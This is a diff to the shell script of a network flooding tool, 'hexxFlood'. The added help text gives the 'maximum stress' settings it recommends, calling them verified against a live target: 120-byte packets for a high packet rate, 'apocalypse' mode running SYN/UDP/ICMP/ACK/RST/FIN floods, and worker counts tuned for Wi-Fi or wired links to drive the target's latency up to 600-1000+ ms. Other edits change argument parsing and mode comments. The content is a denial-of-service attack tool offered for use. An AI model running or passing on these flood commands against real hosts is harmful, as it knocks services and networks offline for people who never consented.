@@ -174,7 +174,20 @@ show_help() {
     echo "  custom     - Use your own settings"
     echo ""
     echo -e "${YELLOW}Examples:${NC}"
-    echo "  # IP Attack"
+    echo -e "${GREEN}  # ⭐ RECOMMENDED — MAXIMUM STRESS (verified against a live target)${NC}"
+    echo "  # KEY: small packets (-s 120) = huge packet rate = real stress. The default"
+    echo "  #      65495 maxes bandwidth but sends few pps. Pick by your link:"
+    echo ""
+    echo "  # 📶 Wi-Fi — most stress (target latency spikes to ~600-1000+ ms):"
+    echo "  sudo hexxFlood -t 192.168.1.10 -m apocalypse -s 120 --cap 64"
+    echo "  # 📶 Wi-Fi — most packets/sec instead (~14,000 pps): fewer workers"
+    echo "  sudo hexxFlood -t 192.168.1.10 -m apocalypse -s 120 --cap 16"
+    echo "  #   (on Wi-Fi do NOT use --no-cap: 256 workers collide and send LESS)"
+    echo ""
+    echo "  # 🔌 LAN / wired — no congestion collapse, so unleash everything:"
+    echo "  sudo hexxFlood -t 192.168.1.10 -i eth0 -m apocalypse -s 120 --no-cap"
+    echo ""
+    echo "  # IP Attack (default: full 65495-byte packets = max bandwidth)"
     echo "  hexxFlood -t 192.168.1.10 -m extreme"
     echo "  hexxFlood -t 192.168.1.10 -m apocalypse -D 60"
     echo ""
@@ -516,7 +529,7 @@ parse_args() {
             -u|--url) URL="$2"; parse_url "$URL"; shift 2 ;;
             --web) TARGET_TYPE="url"; shift ;;
             -p|--threads) THREADS="$2"; shift 2 ;;
-            -s|--size) PACKET_SIZE="$2"; shift 2 ;;
+            -s|--size) PACKET_SIZE="$2"; SIZE_SET=1; shift 2 ;;
             -d|--delay) DELAY="$2"; shift 2 ;;
             -i|--interface) INTERFACE="$2"; shift 2 ;;
             -m|--mode) MODE="$2"; shift 2 ;;
@@ -550,8 +563,9 @@ set_mode() {
         easy)       THREADS=10;  DELAY="u100"; ATTACK_TYPES="syn,udp,icmp" ;;
         medium)     THREADS=25;  DELAY="u10";  ATTACK_TYPES="syn,udp,icmp,ack" ;;
         high)       THREADS=50;  DELAY="u1";   ATTACK_TYPES="syn,udp,icmp,ack,rst,fin" ;;
-        # extreme/apocalypse auto-stop after 60s unless the user passed an
-        # explicit -D (including -D 0 for infinite), which always wins.
+        # extreme/apocalypse send full-size 65495-byte packets (the global default)
+        # for maximum bandwidth, and auto-stop after 60s unless you pass an explicit
+        # -D (including -D 0 for infinite), which wins. Use -s to change packet size.
         extreme)    THREADS=100; DELAY="u1";   ATTACK_TYPES="all"; [ "${DURATION_SET:-0}" = 1 ] || ATTACK_DURATION=60 ;;
         apocalypse) THREADS=200; DELAY="u1";   ATTACK_TYPES="all"; [ "${DURATION_SET:-0}" = 1 ] || ATTACK_DURATION=60 ;;
         custom) ;;
